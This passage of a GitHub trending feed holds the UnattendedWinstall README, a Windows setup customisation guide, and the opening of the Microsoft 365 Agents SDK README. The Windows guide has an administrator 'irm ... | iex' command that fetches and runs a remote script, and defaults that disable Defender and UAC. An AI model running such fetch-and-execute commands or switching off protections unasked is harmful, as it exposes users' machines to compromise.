   &lt;li&gt;&lt;em&gt;(Tested on Windows 10 22H2 &amp;amp; Windows 11 24H2)&lt;/em&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;em&gt;(32-bit, 64-bit and arm64 is supported)&lt;/em&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;What Does UnattendedWinstall Do?&lt;/h2&gt; 
&lt;p&gt;The UnattendedWinstall answer file comes with detailed descriptions for nearly all configurations and registry tweaks, which are available for inspection here on GitHub. For customization, download the answer file and open it in editors like &lt;a href=&quot;https://www.cursor.com/&quot;&gt;Cursor&lt;/a&gt; or &lt;a href=&quot;https://code.visualstudio.com/&quot;&gt;VSCode&lt;/a&gt;.&lt;/p&gt; 
&lt;h3&gt;Sources and Contributions&lt;/h3&gt; 
&lt;details&gt; 
 &lt;summary&gt;Click to Show&lt;/summary&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;strong&gt;Base Answer File Generation&lt;/strong&gt;: 
   &lt;ul&gt; 
    &lt;li&gt;&lt;a href=&quot;https://schneegans.de/windows/unattend-generator/&quot;&gt;Schneegans Unattend Generator&lt;/a&gt;&lt;/li&gt; 
   &lt;/ul&gt; &lt;/li&gt; 
  &lt;li&gt;&lt;strong&gt;Tweaks &amp;amp; Optimizations&lt;/strong&gt;: 
   &lt;ul&gt; 
    &lt;li&gt;&lt;a href=&quot;https://github.com/ChrisTitusTech/winutil&quot;&gt;ChrisTitusTech WinUtil&lt;/a&gt;&lt;/li&gt; 
    &lt;li&gt;&lt;a href=&quot;https://github.com/FR33THYFR33THY/Ultimate-Windows-Optimization-Guide&quot;&gt;FR33THY&#39;s Ultimate Windows Optimization Guide&lt;/a&gt;&lt;/li&gt; 
   &lt;/ul&gt; &lt;/li&gt; 
  &lt;li&gt;&lt;strong&gt;Additional Tweaks&lt;/strong&gt;: 
   &lt;ul&gt; 
    &lt;li&gt;&lt;a href=&quot;https://github.com/ntdevlabs/tiny11builder&quot;&gt;Tiny11Builder&lt;/a&gt;&lt;/li&gt; 
    &lt;li&gt;&lt;a href=&quot;https://www.tenforums.com/&quot;&gt;Ten Forums&lt;/a&gt;&lt;/li&gt; 
    &lt;li&gt;&lt;a href=&quot;https://www.elevenforum.com/&quot;&gt;Eleven Forum&lt;/a&gt;&lt;/li&gt; 
    &lt;li&gt;&lt;a href=&quot;https://winaerotweaker.com/&quot;&gt;Winaero Tweaker&lt;/a&gt;&lt;/li&gt; 
   &lt;/ul&gt; &lt;/li&gt; 
 &lt;/ul&gt; 
&lt;/details&gt; 
&lt;h3&gt;Key Features&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;Ability to choose Windows Edition (Pro is not enforced anymore as in v2.0.0)&lt;/li&gt; 
 &lt;li&gt;Bypasses Windows 11 system requirements&lt;/li&gt; 
 &lt;li&gt;Disables Windows Defender services by default 
  &lt;ul&gt; 
   &lt;li&gt;&lt;em&gt;prompted to enable after Windows installation&lt;/em&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;Disables User Account Control by default 
  &lt;ul&gt; 
   &lt;li&gt;&lt;em&gt;prompted to enable after Windows installation&lt;/em&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;Allows execution of PowerShell scripts by default&lt;/li&gt; 
 &lt;li&gt;Skips forced Microsoft account creation during Windows setup&lt;/li&gt; 
 &lt;li&gt;Removes preinstalled bloatware apps except Microsoft Edge, Notepad and Calculator 
  &lt;ul&gt; 
   &lt;li&gt;Copilot and Recall is Disabled.&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;Sets privacy-related registry keys to disable telemetry&lt;/li&gt; 
 &lt;li&gt;Limits Windows Update to install only security updates for one year&lt;/li&gt; 
 &lt;li&gt;Optimizes registry with various optimization and customization-related keys 
  &lt;ul&gt; 
   &lt;li&gt;&lt;em&gt;See the &quot;Set-RecommendedHKLMRegistry&quot; and &quot;Set-RecommendedHKCURegistry&quot; functions for more information&lt;/em&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;Disables unnecessary scheduled tasks&lt;/li&gt; 
 &lt;li&gt;Configures Windows services for optimal performance&lt;/li&gt; 
 &lt;li&gt;Enables the Ultimate Performance power plan&lt;/li&gt; 
&lt;/ul&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;[!NOTE] Use the &lt;code&gt;UWScript.ps1&lt;/code&gt; file once Windows is installed to reapply or revert settings in case Windows Update resets some of the settings or if you encounter any issues.&lt;br /&gt; It can also be used to achieve a similar experience to UnattendedWinstall on an existing Windows installation without reinstalling Windows.&lt;/p&gt; 
 &lt;hr /&gt; 
 &lt;p&gt;&lt;strong&gt;Before Running the Script&lt;/strong&gt;&lt;/p&gt; 
 &lt;p&gt;Ensure you open PowerShell as an administrator. Additionally, set the execution policy to allow script execution by running the following command:&lt;/p&gt; 
 &lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;Set-ExecutionPolicy Unrestricted
&lt;/code&gt;&lt;/pre&gt; 
 &lt;p&gt;Running PowerShell with elevated permissions and enabling script execution will ensure that &lt;code&gt;UWScript.ps1&lt;/code&gt; can apply the necessary system changes.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;h2&gt;Usage Instructions&lt;/h2&gt; 
&lt;p&gt;To use an answer file, include &lt;code&gt;autounattend.xml&lt;/code&gt; at the root of your Windows Installation Media to be executed during Windows setup.&lt;/p&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;[!IMPORTANT]&lt;br /&gt; Ensure the answer file is named &lt;code&gt;autounattend.xml&lt;/code&gt;; otherwise, it won’t be recognized by the installer.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;hr /&gt; 
&lt;h3&gt;Using Memory&#39;s &lt;a href=&quot;https://github.com/memstechtips/WIMUtil&quot;&gt;WIMUtil&lt;/a&gt; (Highly Preferred)&lt;/h3&gt; 
&lt;p&gt;To use &lt;strong&gt;WIMUtil&lt;/strong&gt;, follow these steps to launch PowerShell as an Administrator and run the installation script:&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Open PowerShell as Administrator:&lt;/strong&gt;&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;&lt;strong&gt;Windows 10/11&lt;/strong&gt;: Right-click on the &lt;strong&gt;Start&lt;/strong&gt; button and select &lt;strong&gt;Windows PowerShell (Admin)&lt;/strong&gt; or &lt;strong&gt;Windows Terminal (Admin)&lt;/strong&gt;. &lt;br /&gt; PowerShell will open in a new window.&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Confirm Administrator Privileges&lt;/strong&gt;:&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;If prompted by the User Account Control (UAC), click &lt;strong&gt;Yes&lt;/strong&gt; to allow PowerShell to run as an administrator.&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Paste and Run the Command&lt;/strong&gt;:&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;Copy the following command: &lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;irm &quot;https://github.com/memstechtips/WIMUtil/raw/main/src/WIMUtil.ps1&quot; | iex
&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; 
   &lt;li&gt;To paste into PowerShell, &lt;strong&gt;Right-Click&lt;/strong&gt; or press &lt;strong&gt;Ctrl + V&lt;/strong&gt; in the PowerShell or Terminal window. &lt;br /&gt; This should automatically paste your copied command.&lt;/li&gt; 
   &lt;li&gt;Press &lt;strong&gt;Enter&lt;/strong&gt; to execute the command.&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;Once launched, &lt;strong&gt;WIMUtil&lt;/strong&gt; guides you through a wizard:&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;&lt;strong&gt;Select or Download Windows ISO&lt;/strong&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Add Latest UnattendedWinstall Answer File Automatically&lt;/strong&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Extract and Add Current Device Drivers to Installation Media&lt;/strong&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Create New ISO with Customizations Included&lt;/strong&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Create a Bootable USB Flash Drive with &lt;a href=&quot;https://github.com/ventoy/Ventoy&quot;&gt;Ventoy&lt;/a&gt;&lt;/strong&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Copy the New ISO File to the Ventoy Flash Drive&lt;/strong&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Boot from the USB flash drive, choose your ISO &amp;amp; Install Windows&lt;/strong&gt;&lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;For more info, check out the official &lt;a href=&quot;https://github.com/memstechtips/WIMUtil&quot;&gt;WIMUtil&lt;/a&gt; GitHub Repo.&lt;/p&gt; 
&lt;hr /&gt; 
&lt;h3&gt;Old Methods&lt;/h3&gt; 
&lt;h4&gt;Method 1: Create a Bootable Windows Installation USB&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://youtu.be/pDEZDD_gEbo&quot;&gt;Video Tutorial&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;details&gt; 
 &lt;summary&gt;Click to Show Instructions&lt;/summary&gt; 
 &lt;ol&gt; 
  &lt;li&gt; &lt;p&gt;Download the &lt;code&gt;autounattend.xml&lt;/code&gt; file and save it on your computer.&lt;/p&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;Create a &lt;a href=&quot;https://www.microsoft.com/en-us/software-download/windows10&quot;&gt;Windows 10&lt;/a&gt; or &lt;a href=&quot;https://www.microsoft.com/en-us/software-download/windows11&quot;&gt;Windows 11&lt;/a&gt; Bootable Installation USB drive with &lt;a href=&quot;https://rufus.ie/en/&quot;&gt;Rufus&lt;/a&gt; or the Media Creation Tool.&lt;/p&gt; 
   &lt;blockquote&gt; 
    &lt;p&gt;&lt;strong&gt;Important&lt;/strong&gt;&lt;/p&gt; 
    &lt;ul&gt; 
     &lt;li&gt;Some users have reported issues with the Media Creation Tool when creating the Windows Installation USB. Use it at your own discretion.&lt;/li&gt; 
     &lt;li&gt;When using Rufus, don’t select any of the checkboxes in “Customize Your Windows Experience,” as it creates another &lt;code&gt;autounattend.xml&lt;/code&gt; file that might overwrite settings in the UnattendedWinstall file.&lt;/li&gt; 
    &lt;/ul&gt; 
   &lt;/blockquote&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;Copy the &lt;code&gt;autounattend.xml&lt;/code&gt; file you downloaded in Step 1 to the root of the Bootable Windows Installation USB you created in Step 2.&lt;/p&gt; &lt;/li&gt; 
  &lt;li&gt; &lt;p&gt;Boot from the Windows Installation USB, do a clean install of Windows as normal, and the scripts will run automatically.&lt;/p&gt; &lt;/li&gt; 
 &lt;/ol&gt; 
&lt;/details&gt; 
&lt;h4&gt;Method 2: Create a Custom ISO File&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://youtu.be/pDEZDD_gEbo?si=ChEGghEOLCyLSnp7&amp;amp;t=1117&quot;&gt;Video Tutorial&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;details&gt; 
 &lt;summary&gt;Click to Show Instructions&lt;/summary&gt; 
 &lt;ol&gt; 
  &lt;li&gt;Download the &lt;code&gt;autounattend.xml&lt;/code&gt; file and save it on your computer.&lt;/li&gt; 
  &lt;li&gt;Download the &lt;a href=&quot;https://www.microsoft.com/en-us/software-download/windows10&quot;&gt;Windows 10&lt;/a&gt; or &lt;a href=&quot;https://www.microsoft.com/en-us/software-download/windows11&quot;&gt;Windows 11&lt;/a&gt; ISO file depending on the version you want.&lt;/li&gt; 
  &lt;li&gt;Download and install &lt;a href=&quot;https://anyburn.com/download.php&quot;&gt;AnyBurn&lt;/a&gt; 
   &lt;ul&gt; 
    &lt;li&gt;In AnyBurn, select the “Edit Image File” option.&lt;/li&gt; 
    &lt;li&gt;Navigate to and select the Official Windows ISO file you downloaded in Step 2.&lt;/li&gt; 
    &lt;li&gt;Click on “Add” and select the &lt;code&gt;autounattend.xml&lt;/code&gt; file you downloaded in Step 1, or just click and drag the &lt;code&gt;autounattend.xml&lt;/code&gt; into the AnyBurn window.&lt;/li&gt; 
    &lt;li&gt;Click on “Next,” then on “Create Now.” You should be prompted to overwrite the ISO file; click on “Yes.”&lt;/li&gt; 
    &lt;li&gt;Once the process is complete, close AnyBurn.&lt;/li&gt; 
   &lt;/ul&gt; &lt;/li&gt; 
  &lt;li&gt;Use the ISO file to install Windows on a Virtual Machine OR use a program like &lt;a href=&quot;https://rufus.ie/en/&quot;&gt;Rufus&lt;/a&gt; or &lt;a href=&quot;https://github.com/ventoy/Ventoy&quot;&gt;Ventoy&lt;/a&gt; to create a bootable USB flash drive with the edited Windows ISO file.&lt;/li&gt; 
 &lt;/ol&gt; 
 &lt;blockquote&gt; 
  &lt;p&gt;&lt;strong&gt;Important&lt;/strong&gt;&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;When using Rufus, don’t select any of the checkboxes in “Customize Your Windows Experience,” as it creates another &lt;code&gt;autounattend.xml&lt;/code&gt; file that might overwrite settings in the UnattendedWinstall file.&lt;/li&gt; 
  &lt;/ul&gt; 
 &lt;/blockquote&gt; 
 &lt;ol start=&quot;5&quot;&gt; 
  &lt;li&gt;Boot from the Windows Installation USB, do a clean install of Windows as normal, and the scripts will run automatically.&lt;/li&gt; 
 &lt;/ol&gt; 
&lt;/details&gt; 
&lt;h4&gt;Method 3: Use Ventoy Auto Install Plugin&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://youtu.be/4AGZQJTyCOs&quot;&gt;Video Tutorial&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;details&gt; 
 &lt;summary&gt;Click to Show Instructions&lt;/summary&gt; 
 &lt;ol&gt; 
  &lt;li&gt;Download the &lt;code&gt;autounattend.xml&lt;/code&gt; file and save it on your computer.&lt;/li&gt; 
  &lt;li&gt;Download the &lt;a href=&quot;https://www.microsoft.com/en-us/software-download/windows10&quot;&gt;Windows 10&lt;/a&gt; or &lt;a href=&quot;https://www.microsoft.com/en-us/software-download/windows11&quot;&gt;Windows 11&lt;/a&gt; ISO file, depending on the version you want.&lt;/li&gt; 
  &lt;li&gt;Download and install &lt;a href=&quot;https://github.com/ventoy/Ventoy&quot;&gt;Ventoy&lt;/a&gt; to your desired USB flash drive.&lt;/li&gt; 
  &lt;li&gt;Prepare the folder structure: 
   &lt;ul&gt; 
    &lt;li&gt;In your newly created Ventoy USB disk, create the following folders: &lt;code&gt;ISO&lt;/code&gt; and &lt;code&gt;Templates&lt;/code&gt;. &lt;br /&gt; &lt;em&gt;They should be at the root of the drive.&lt;/em&gt;&lt;/li&gt; 
    &lt;li&gt;Inside of the &lt;code&gt;ISO&lt;/code&gt; folder, create a new folder called &lt;code&gt;Windows&lt;/code&gt;.&lt;/li&gt; 
    &lt;li&gt;Copy your Windows ISO files in the &lt;code&gt;ISO\Windows&lt;/code&gt; folder.&lt;/li&gt; 
    &lt;li&gt;Copy your &lt;code&gt;autounattend.xml&lt;/code&gt; into the &lt;code&gt;Templates&lt;/code&gt; folder.&lt;/li&gt; 
   &lt;/ul&gt; &lt;/li&gt; 
  &lt;li&gt;Start VentoyPlugson. Depending on your OS, the steps might differ. 
   &lt;ul&gt; 
    &lt;li&gt;On Windows, run the &lt;code&gt;VentoyPlugson.exe&lt;/code&gt; file.&lt;/li&gt; 
    &lt;li&gt;A new browser window should open up with a Ventoy web interface ready to go.&lt;/li&gt; 
    &lt;li&gt;Select the &lt;code&gt;Auto Install Plugin&lt;/code&gt; menu from the list.&lt;/li&gt; 
    &lt;li&gt;Click on the &lt;code&gt;Add&lt;/code&gt; button.&lt;/li&gt; 
    &lt;li&gt;Select [parent] to make the whole Windows ISO folder benefit from the plugin.&lt;/li&gt; 
    &lt;li&gt;In the Directory Path, paste in the absolute path to your &lt;code&gt;Windows&lt;/code&gt; folder. &lt;br /&gt; example: &lt;code&gt;F:\ISO\Windows&lt;/code&gt; (Replace &lt;code&gt;F&lt;/code&gt; with your drive letter.)&lt;/li&gt; 
    &lt;li&gt;In the Template Path, paste in the absolute path to your &lt;code&gt;autounattend.xml&lt;/code&gt; file. &lt;br /&gt; example: &lt;code&gt;F:\Templates\autounattend.xml&lt;/code&gt; (Replace &lt;code&gt;F&lt;/code&gt; with your drive letter.) &lt;br /&gt; (PSA: If you have more &lt;code&gt;autounattend.xml&lt;/code&gt; files, you can add them later on!)&lt;/li&gt; 
    &lt;li&gt;Click on &lt;code&gt;OK&lt;/code&gt; and you should see a message saying that the configuration has been saved successfully.&lt;/li&gt; 
    &lt;li&gt;Close the VentoyPlugson browser window and stop the VentoyPlugson application.&lt;/li&gt; 
   &lt;/ul&gt; &lt;/li&gt; 
  &lt;li&gt;Boot from the Ventoy USB drive in the computer where you want to install windows. 
   &lt;ul&gt; 
    &lt;li&gt;After selecting a Windows ISO to boot from, you will be prompted to boot with the &lt;code&gt;/Templates/autounattend.xml&lt;/code&gt; file.&lt;/li&gt; 
    &lt;li&gt;Select that option and the &lt;code&gt;autounattend.xml&lt;/code&gt; will be automatically executed during installation.&lt;/li&gt; 
   &lt;/ul&gt; &lt;/li&gt; 
 &lt;/ol&gt; 
&lt;/details&gt; 
&lt;h2&gt;FAQ&lt;/h2&gt; 
&lt;h3&gt;How can I apply these settings to an existing Windows installation?&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;Run the &lt;a href=&quot;https://github.com/memstechtips/UnattendedWinstall/raw/main/UWScript.ps1&quot;&gt;&lt;code&gt;UWScript.ps1&lt;/code&gt;&lt;/a&gt; file or use the &lt;a href=&quot;https://github.com/ChrisTitusTech/winutil&quot;&gt;Chris Titus Tech Windows Utility&lt;/a&gt; (&lt;a href=&quot;https://youtu.be/pldFPTnOCGM&quot;&gt;Video&lt;/a&gt;).&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Can this answer file be used for an in-place upgrade?&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;No, in-place upgrades do not support answer files.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Why is Windows still updating automatically?&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;Feature updates are delayed for a year; however, security and driver updates continue as usual.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Why don&#39;t I have internet after installing Windows?&lt;/h3&gt; 
&lt;details&gt; 
 &lt;summary&gt;Click to Show Instructions&lt;/summary&gt; 
 &lt;p&gt;If you’re unable to connect to the internet after installation, it’s likely because your Wi-Fi or LAN (Ethernet) drivers are missing. Windows sometimes doesn’t include all necessary drivers for network adapters, especially if they’re specific to your device.&lt;/p&gt; 
 &lt;p&gt;To resolve this, follow these steps:&lt;/p&gt; 
 &lt;ol&gt; 
  &lt;li&gt;&lt;strong&gt;Download your network driver&lt;/strong&gt; from the manufacturer’s website on another computer with internet access. Look for Wi-Fi or LAN drivers specific to your device model.&lt;/li&gt; 
  &lt;li&gt;&lt;strong&gt;Transfer the driver&lt;/strong&gt; to your Windows installation via USB drive.&lt;/li&gt; 
  &lt;li&gt;&lt;strong&gt;Install the driver&lt;/strong&gt; on your Windows system and restart if necessary.&lt;/li&gt; 
 &lt;/ol&gt; 
 &lt;p&gt;After installation, you should be able to connect to the internet.&lt;/p&gt; 
&lt;/details&gt; 
&lt;h3&gt;How can I access the previous &quot;IoT-LTSC-Like,&quot; &quot;Standard,&quot; and &quot;Core&quot; versions of the file(s)?&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;You still have access to the previous files here: &lt;a href=&quot;https://github.com/memstechtips/UnattendedWinstall/releases/tag/v1.0.0&quot;&gt;Version 1.0.0 Release&lt;/a&gt;.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;[!NOTE]&lt;br /&gt; You need to download the &lt;code&gt;Source Code.zip&lt;/code&gt; file. Once extracted, you’ll have access to all the previous v1.0.0 files.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;h3&gt;Why isn&#39;t Microsoft Edge Uninstalled?&lt;/h3&gt; 
&lt;details&gt; 
 &lt;summary&gt;Click to Show Explanation&lt;/summary&gt; 
 &lt;p&gt;I spent a lot of time trying to find a way to uninstall Microsoft Edge during Windows installation. However, it was challenging because of differences between Windows 10 22H2 and Windows 11 24H2. My goal is to use Microsoft’s supported uninstall methods, and I plan to add an easy Edge removal option in future releases.&lt;/p&gt; 
 &lt;p&gt;In the meantime, if you wish to remove Edge after Windows installation, consider using &lt;a href=&quot;https://github.com/FR33THYFR33THY/Ultimate-Windows-Optimization-Guide/raw/main/6%20Windows/14%20Edge.ps1&quot;&gt;this script by FR33THY&lt;/a&gt;. FR33THY’s &lt;em&gt;Ultimate Windows Optimization Guide&lt;/em&gt; was a major inspiration for version 2.0.0 of this project, and I highly recommend exploring it for additional Windows optimization tips.&lt;/p&gt; 
&lt;/details&gt; 
&lt;h3&gt;How can I add my own Registry Tweaks to v2.0.0 of the &lt;code&gt;autounattend.xml&lt;/code&gt; file?&lt;/h3&gt; 
&lt;details&gt; 
 &lt;summary&gt;Click to Show Instructions&lt;/summary&gt; 
 &lt;p&gt;You can also still add your own registry entries to the v2.0.0 file, and it is actually easier if you understand where to add it. I&#39;ll give a brief explanation.&lt;/p&gt; 
 &lt;p&gt;For registry entries that apply to the local machine, i.e., &lt;code&gt;HKEY_LOCAL_MACHINE&lt;/code&gt; registry keys, you can find the &lt;code&gt;function SetRecommendedHKLMRegistry&lt;/code&gt; in the &lt;code&gt;autounattend.xml&lt;/code&gt; file, see here: &lt;a href=&quot;https://github.com/memstechtips/UnattendedWinstall/raw/93305192ed6d64e0f5b98a89f447927480285354/autounattend.xml#L1981&quot;&gt;https://github.com/memstechtips/UnattendedWinstall/blob/93305192ed6d64e0f5b98a89f447927480285354/autounattend.xml#L1981&lt;/a&gt;&lt;/p&gt; 
 &lt;p&gt;and then add whatever registry entries you want to add in &lt;code&gt;.reg&lt;/code&gt; format, like the rest of the entries are set, and just make sure you add it before the &lt;code&gt;&quot;@&lt;/code&gt; to make it part of the &lt;code&gt;.reg&lt;/code&gt; file that will be generated, see here: &lt;a href=&quot;https://github.com/memstechtips/UnattendedWinstall/raw/93305192ed6d64e0f5b98a89f447927480285354/autounattend.xml#L3412&quot;&gt;https://github.com/memstechtips/UnattendedWinstall/blob/93305192ed6d64e0f5b98a89f447927480285354/autounattend.xml#L3412&lt;/a&gt;&lt;/p&gt; 
 &lt;p&gt;and it will then be applied to the registry.&lt;/p&gt; 
 &lt;p&gt;Similarly, if you have &lt;code&gt;HKEY_CURRENT_USER&lt;/code&gt; registry keys, you can add those to the &lt;code&gt;User Customization.ps1&lt;/code&gt; file in the same way as explained above, starting here: &lt;a href=&quot;https://github.com/memstechtips/UnattendedWinstall/raw/93305192ed6d64e0f5b98a89f447927480285354/autounattend.xml#L3912&quot;&gt;https://github.com/memstechtips/UnattendedWinstall/blob/93305192ed6d64e0f5b98a89f447927480285354/autounattend.xml#L3912&lt;/a&gt; so below the &lt;code&gt;Windows Registry Editor Version 5.00&lt;/code&gt; and then ending before the &lt;code&gt;&quot;@&lt;/code&gt; here: &lt;a href=&quot;https://github.com/memstechtips/UnattendedWinstall/raw/93305192ed6d64e0f5b98a89f447927480285354/autounattend.xml#L4423&quot;&gt;https://github.com/memstechtips/UnattendedWinstall/blob/93305192ed6d64e0f5b98a89f447927480285354/autounattend.xml#L4423&lt;/a&gt;&lt;/p&gt; 
 &lt;blockquote&gt; 
  &lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;&lt;br /&gt; The above links might not take you to the correct lines of code once new versions of the file are released, but it does take you to the correct lines on v2.0.0.&lt;/p&gt; 
 &lt;/blockquote&gt; 
&lt;/details&gt;</description>
    </item>
    
    <item>
      <title>microsoft/Agents</title>
      <link>https://github.com/microsoft/Agents</link>
      <description>&lt;p&gt;The Microsoft 365 Agent SDK simplifies building full stack, multichannel, trusted agents for platforms including M365, Teams, Copilot Studio, and Webchat.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Microsoft 365 Agents SDK&lt;/h1&gt; 
&lt;p&gt;With the Microsoft 365 Agents SDK, you can create agents deployable to channels of your choice, such as Microsoft 365 Copilot, Microsoft Teams, Web &amp;amp; Custom Apps and more, with scaffolding to handle the required communication. Developers can use the AI Services of their choice, and make the agents they build available using the channel management capabilities of the SDK.&lt;/p&gt; 
&lt;p&gt;Developers need the flexibility to integrate agents from any provider or technology stack into their enterprise systems. The Agents SDK simplifies the implementation of agentic patterns using the AI of their choice, allowing them to select one or more services, models, or agents to meet their specific requirements.&lt;/p&gt; 
&lt;p&gt;Use the Agents SDK to:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Quickly build an agent &#39;container&#39; with state, storage, and the ability to manage activities and events. Deploy this container across any channel, such as Microsoft 365 Copilot or Microsoft Teams.&lt;/li&gt; 
 &lt;li&gt;Implement agentic patterns without being restricted to a specific technology stack. The Agents SDK is agnostic regarding the AI you choose.&lt;/li&gt; 
 &lt;li&gt;Customize your agent to align with the specific behaviors of clients, such as Microsoft Teams.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;C#, JavaScript &amp;amp; Python Repository links&lt;/h2&gt; 
&lt;p&gt;The source for the client libraries exists for the most part in repositories for each language. This repository is meant to be a jumping off point into those language specific repositories. Issues related to a specific language should be opened in the corresponding repository but cross cutting issues can be opened in this repository.&lt;/p&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th align=&quot;left&quot;&gt;Language&lt;/th&gt; 
   &lt;th align=&quot;center&quot;&gt;Repo&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td align=&quot;left&quot;&gt;General (This repo)&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;&lt;a href=&quot;https://github.com/Microsoft/Agents&quot;&gt;Agents Repository&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align=&quot;left&quot;&gt;C# /.NET&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;&lt;a href=&quot;https://github.com/Microsoft/Agents-for-net&quot;&gt;Agents-for-net Repository&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align=&quot;left&quot;&gt;JavaScript&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;&lt;a href=&quot;https://github.com/Microsoft/Agents-for-js&quot;&gt;Agents-for-js Repository&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align=&quot;left&quot;&gt;Python&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;&lt;a href=&quot;https://github.com/Microsoft/Agents-for-python&quot;&gt;Agents-for-python Repository&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;h2&gt;Documentation&lt;/h2&gt; 
&lt;p&gt;To learn more about the Agents SDK, you can read our official docs here: &lt;a href=&quot;https://aka.ms/M365-Agents-SDK-Docs&quot;&gt;Agents SDK Documentation&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;Related SDKs&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Semantic Kernel&lt;/strong&gt;. &lt;a href=&quot;https://learn.microsoft.com/en-us/semantic-kernel/overview/&quot;&gt;Semantic Kernel&lt;/a&gt; is an SDK that integrates Large Language Models (LLMs) like &lt;a href=&quot;https://platform.openai.com/docs/introduction&quot;&gt;OpenAI&lt;/a&gt;, &lt;a href=&quot;https://azure.microsoft.com/en-us/products/ai-services/openai-service&quot;&gt;Azure OpenAI&lt;/a&gt;, and &lt;a href=&quot;https://huggingface.co/&quot;&gt;Hugging Face&lt;/a&gt; with conventional programming languages like C#, Python, and Java. Semantic Kernel achieves this by allowing you to define &lt;a href=&quot;https://learn.microsoft.com/en-us/semantic-kernel/concepts/plugins&quot;&gt;plugins&lt;/a&gt; that can be chained together in just a &lt;a href=&quot;https://learn.microsoft.com/en-us/semantic-kernel/ai-orchestration/chaining-functions?tabs=Csharp#using-the-runasync-method-to-simplify-your-code&quot;&gt;few lines of code&lt;/a&gt;.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Azure AI Foundry&lt;/strong&gt;. Provides the core backend agent functionality, providing reasoning, retrieval augmentation, observability, among other core functions. Developers can leverage the Azure AI Agent Service or build their agent functionality with individual components from this SDK.&lt;/p&gt; &lt;/li&gt; 
